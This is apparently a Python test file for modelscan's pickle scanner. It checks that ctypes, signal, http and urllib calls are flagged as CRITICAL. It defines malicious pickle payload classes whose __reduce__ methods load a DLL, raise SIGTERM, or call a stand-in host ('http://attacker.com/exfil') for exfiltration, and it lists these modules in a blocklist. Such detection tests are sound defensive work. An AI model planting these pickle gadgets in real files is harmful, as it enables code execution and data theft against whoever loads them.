"""
Tests for ctypes, signal, http, urllib additions to unsafe_globals blocklist.

Verifies that pickle payloads using ctypes.CDLL, signal.raise_signal,
http.client.HTTPConnection, and urllib.request.urlopen are correctly
flagged as CRITICAL by modelscan's pickle scanner.
"""

import ctypes
import io
import pickle
import signal
import urllib.request
from typing import Any, Dict

from modelscan.modelscan import ModelScan  # must import first to avoid circular
from modelscan.issues import (
    Issue,
    IssueCode,
    IssueSeverity,
    OperatorIssueDetails,
)
from modelscan.model import Model
from modelscan.settings import DEFAULT_SETTINGS
from modelscan.tools.picklescanner import scan_pickle_bytes

settings: Dict[str, Any] = DEFAULT_SETTINGS


class MaliciousCtypesCDLL:
    """Payload using ctypes.CDLL to load a shared library (DllMain RCE)."""

    def __reduce__(self) -> Any:
        return ctypes.CDLL, ("msvcrt",)


class MaliciousSignal:
    """Payload using signal.raise_signal for process crash (DoS)."""

    def __reduce__(self) -> Any:
        return signal.raise_signal, (signal.SIGTERM,)


class MaliciousUrllib:
    """Payload using urllib.request.urlopen for data exfiltration."""

    def __reduce__(self) -> Any:
        return urllib.request.urlopen, ("http://attacker.com/exfil",)


def test_ctypes_cdll_detected():
    """ctypes.CDLL must be flagged as CRITICAL unsafe operator."""
    expected = [
        Issue(
            IssueCode.UNSAFE_OPERATOR,
            IssueSeverity.CRITICAL,
            OperatorIssueDetails(
                "ctypes", "CDLL", IssueSeverity.CRITICAL, "payload.pkl"
            ),
        )
    ]
    model = Model("payload.pkl", io.BytesIO(pickle.dumps(MaliciousCtypesCDLL())))
    result = scan_pickle_bytes(model, settings)
    assert result.issues == expected


def test_signal_detected():
    """signal module payloads must be flagged as CRITICAL.

    Note: pickle serializes signal.raise_signal as either 'signal' or
    '_signal' depending on protocol version and platform. Both must be blocked.
    """
    payload = pickle.dumps(MaliciousSignal(), protocol=0)
    model = Model("payload.pkl", io.BytesIO(payload))
    result = scan_pickle_bytes(model, settings)
    assert len(result.issues) >= 1, "signal payload must be detected"
    modules_found = {i.details.module for i in result.issues}
    assert modules_found & {"signal", "_signal"}, (
        f"Expected 'signal' or '_signal' in detected modules, got {modules_found}"
    )
    assert all(i.severity == IssueSeverity.CRITICAL for i in result.issues)


def test_urllib_detected():
    """urllib.request.urlopen must be flagged as CRITICAL unsafe operator."""
    payload = pickle.dumps(MaliciousUrllib(), protocol=0)
    model = Model("payload.pkl", io.BytesIO(payload))
    result = scan_pickle_bytes(model, settings)
    assert len(result.issues) == 1
    assert result.issues[0].severity == IssueSeverity.CRITICAL
    assert "urllib" in result.issues[0].details.module


def test_new_modules_in_blocklist():
    """Verify all new modules are present in CRITICAL blocklist (regression guard)."""
    critical = settings["unsafe_globals"]["CRITICAL"]
    assert "ctypes" in critical, "ctypes must be in CRITICAL blocklist"
    assert "ctypes.util" in critical, "ctypes.util must be in CRITICAL blocklist"
    assert "http" in critical, "http must be in CRITICAL blocklist"
    assert "http.client" in critical, "http.client must be in CRITICAL blocklist"
    assert "urllib" in critical, "urllib must be in CRITICAL blocklist"
    assert "urllib.request" in critical, "urllib.request must be in CRITICAL blocklist"
    assert "signal" in critical, "signal must be in CRITICAL blocklist"
    assert "_signal" in critical, "_signal must be in CRITICAL blocklist"


def test_ctypes_full_modelscan():
    """End-to-end: ctypes.CDLL payload must be detected by full ModelScan."""
    import os

    ms = ModelScan()
    payload = pickle.dumps(MaliciousCtypesCDLL())
    tmpfile = "_test_ctypes_payload.pkl"

    with open(tmpfile, "wb") as f:
        f.write(payload)

    try:
        ms.scan(tmpfile)
        assert len(ms.issues.all_issues) > 0, (
            "ModelScan must detect ctypes.CDLL payload"
        )
        assert ms.issues.all_issues[0].severity == IssueSeverity.CRITICAL
        assert ms.issues.all_issues[0].details.module == "ctypes"
    finally:
        os.remove(tmpfile)
